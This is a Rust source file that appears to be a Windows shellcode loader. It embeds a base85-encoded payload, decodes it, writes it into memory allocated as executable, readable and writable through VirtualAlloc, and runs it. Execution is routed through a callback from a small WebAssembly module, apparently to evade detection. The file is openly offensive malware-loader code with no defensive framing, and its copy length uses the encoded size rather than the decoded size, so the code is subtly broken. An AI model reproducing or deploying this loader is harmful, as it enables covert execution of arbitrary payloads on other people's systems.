


use wasmtime::{Caller, Engine, Linker, Module, Store};
use windows::Win32::System::Memory::{MEM_COMMIT, PAGE_EXECUTE_READWRITE, VirtualAlloc};

#[derive(RustEmbed)]
#[folder = "src/resources/"]
struct Asset;

pub fn get_shellcode() -> Option<rust_embed::EmbeddedFile> {
    Asset::get("shellcode")
}



pub fn load_shellcode()  -> anyhow::Result<()>{
    let engine = Engine::default();
    let wat = r#"
        (module
            (import "host" "host_func" (func $host_hello (param i32)))

            (func (export "hello")
                i32.const 3
                call $host_hello)
        )
    "#;
    let module = Module::new(&engine, wat)?;

    let mut linker = Linker::new(&engine);
    linker.func_wrap("host", "host_func", |_caller: Caller<'_, u32>, _param: i32| {
        unsafe {
                if let Some(shell_code_file) = get_shellcode() {
                    if let Ok(shellcode) = base85::decode(String::from_utf8(shell_code_file.data.to_vec()).unwrap().as_str()) {
                        let ptr = VirtualAlloc(None, shell_code_file.data.len(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), ptr as *mut u8, shell_code_file.data.len());
                        let fn_virtual: fn() = unsafe { std::mem::transmute(ptr) };
                        fn_virtual();
                    }
                }
        }
    })?;
    // All wasm objects operate within the context of a "store". Each
    // `Store` has a type parameter to store host-specific data, which in
    // this case we're using `4` for.
    let mut store = Store::new(&engine, 4);
    let instance = linker.instantiate(&mut store, &module)?;
    let hello = instance.get_typed_func::<(), ()>(&mut store, "hello")?;

    // And finally we can call the wasm!
    hello.call(&mut store, ())?;

    Ok(())
}